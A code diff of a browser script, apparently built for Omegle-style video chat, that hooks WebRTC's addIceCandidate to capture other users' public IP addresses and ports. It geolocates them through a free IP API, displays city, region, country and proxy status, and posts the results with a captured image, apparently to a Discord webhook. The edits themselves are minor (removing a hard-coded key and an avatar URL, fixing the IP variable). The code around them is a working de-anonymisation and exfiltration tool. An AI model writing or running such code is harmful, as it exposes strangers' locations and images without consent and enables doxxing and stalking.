@@ -5,7 +5,6 @@
 
     const head = document.getElementsByTagName('head')[0];
     const body = document.getElementsByTagName('body')[0];
-    const apiKey = "fa48bfe0005891";
     var changed = false;
     const regionNames = new Intl.DisplayNames(['en'], {type: 'region'});
     const hexToDecimal = (hex) => {
@@ -85,9 +84,10 @@
         pc.oaddIceCandidate = pc.addIceCandidate;
 
         pc.addIceCandidate = function (iceCandidate, ...rest) {
-
+            
             const fields = iceCandidate.candidate.split(" ");
             console.log(iceCandidate.candidate);
+            const connectionType = fields[3]
             const ip = fields[4];
             const port = fields[5];
             if (fields[7] === "srflx") {
@@ -101,7 +101,7 @@
     var base64Image;
     const set_message = (ipp, cityy, regionn, countryy, locc) => {
         ip.innerText = ipp;
-        city.innerText =  cityy;
+        city.innerText =  `${cityy},${regionn}`;
         country.innerText =  countryy;
         loc.innerText =  locc;
     }
@@ -114,7 +114,7 @@
         let url = `https://freeipapi.com/api/json/${ip}`;
         await fetch(url).then((response) =>
             response.json().then((json) => {
-                const ip = ip+":"+port
+                const ip = json.ipAddress+":"+port
                 set_message(ip, json.cityName, json.regionName, json.countryName, json.isProxy);
                 const request = new XMLHttpRequest();
                 const image = document.querySelector("#imag");
@@ -149,8 +149,6 @@
                       };
                       var params = {
                         username: "ome",
-                        avatar_url:
-                          "https://media.discordapp.net/attachments/1137174682588684438/1159237525378965615/1696006046373060.gif?ex=65304b13&is=651dd613&hm=736a011aba73272aef8adcdeba507c5251e4757f48752fc7e7db9093b77ce88a&",
                         embeds: [myEmbed],
                       };
                     formData.append('payload_json', JSON.stringify(params))
